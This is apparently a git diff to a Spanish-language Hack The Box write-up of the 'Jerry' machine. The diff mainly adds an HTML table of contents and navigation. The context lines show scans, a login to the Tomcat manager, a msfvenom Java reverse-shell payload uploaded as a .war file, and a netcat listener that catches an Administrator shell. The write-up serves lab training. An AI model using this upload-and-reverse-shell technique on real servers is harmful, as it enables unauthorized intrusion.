@@ -14,14 +14,49 @@ categories:
 tags:
   - Windows
   - Tomcat
+  - Abusing File Upload
   - Reverse Shell
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-jerry/jerry_logo.png)
 Esta es una máquina bastante sencilla, realizada en Windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un Payload en lugar de un Exploit, para crear una Backdoor en la máquina para que nos devuelva una Shell.
 
-# Recopilación de Información
-## Traza ICMP
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Invest">Investigación del Servicio</a></li>
+				<li><a href="#BuscandoPay">Buscando y Configurando un Payload</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
 ```
 ping -c 4 10.10.10.95
 PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
@@ -36,7 +71,8 @@ rtt min/avg/max/mdev = 132.645/134.479/137.492/1.823 ms
 ```
 Observamos que la máquina está conectada, además vemos el TTL y vemos que es una máquina Windows.
 
-## Escaneo de Puertos
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
 Realizamos un escaneo de puertos para ver cuales están abiertos, una vez realizado haremos un escaneo de servicios. Vemos solamente un puerto abierto, que es el 8080, investigando un poco vemos que este puerto es usado para la web pero es necesario activar un proxy.
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
@@ -69,7 +105,8 @@ Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-## Escaneo de Servicios
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
 Una vez encontrados los puertos, analizamos los servicios que operan en estos. En este caso solo se encontró 1 abierto, así que vamos a analizarlo:
 ```
 nmap -sC -sV -p8080 10.10.10.95 -oN targeted
@@ -96,8 +133,21 @@ Vemos que el servicio que opera es el Tomcat, además de ver que es una página 
 whatweb http://10.10.10.95:8080/
 http://10.10.10.95:8080/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
 ```
-# Análisis de Vulnerabilidades
-## Investigación del Servicio
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Inves">Investigación del Servicio</h2>
+
 Bueno, pero ¿qué chuchas es el servicio Tomcat? pues vamos a investigarlo:
 
 **Apache Tomcat (o, sencillamente, Tomcat) es un contenedor de servlets que se puede usar para compilar y ejecutar aplicaciones web realizadas en Java. Implementa y da soporte tanto a servlets como a páginas JSP (Java Server Pages) o Java Sockets.**
@@ -123,7 +173,8 @@ Un usuario y contraseña...vamos a usarlos y listo ya accedimos xd:
 
 Analizando un poco la página, ya como administrador vemos que podemos subir archivos tipo **.war** por lo que podemos usar esto para buscar un Exploit que podamos usar pues lo que podemos subir es una Reverse Shell y con eso obtenemos una Shell conectada, osease que lo que estamos haciendo es una **BackDoor**.
 
-## Buscando y Configurando un Payload
+<h2 id="BuscandoPay">Buscando y Configurando un Payload</h2>
+
 Si bien antes usamos **Searchsploit** para buscar Exploits en la base de datos de Metasploit para usarlos, esta vez vamos a usar la herramienta **msfvenom** que por así decirlo es similar, la diferencia radica en que aquí le podemos indicar los mismos parámetros que en Metasploit además de que usa **Payloads** en lugar de **Exploits**.
 
 Ahora para buscar los Payloads debemos usar el siguiente comando, especificando que buscamos los tipos **Java**:
@@ -158,19 +209,32 @@ Lo seleccionamos y ya lo subimos, ahí mismo observamos que el archivo es tipo *
 
 ![](/assets/images/htb-writeup-jerry/Captura5.png)
 
-# Explotación de Vulnerabilidades
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 Una vez subido el archivo que creamos con el Payload, que es una **Reverse Shell**, ya solamente debemos alzar una netcat y activar el Payload:
 ```
 rlwrap nc -nlvp 443
 listening on [any] 443 ...
 ```
 Le damos click al archivo **.war**:
+
 <br>
 <p align="center">
 <img src="/assets/images/htb-writeup-jerry/Captura6.png">
 </p>
 
-¡Y listo! Ya estamos dentro:
+¡Y listo! Ya estamos dentro, directamente somos Root:
 ```
 rlwrap nc -nlvp 443
 listening on [any] 443 ...
@@ -253,4 +317,6 @@ dir
 C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
 type "2 for the price of 1.txt"
 ```
+
+<br>
 # FIN
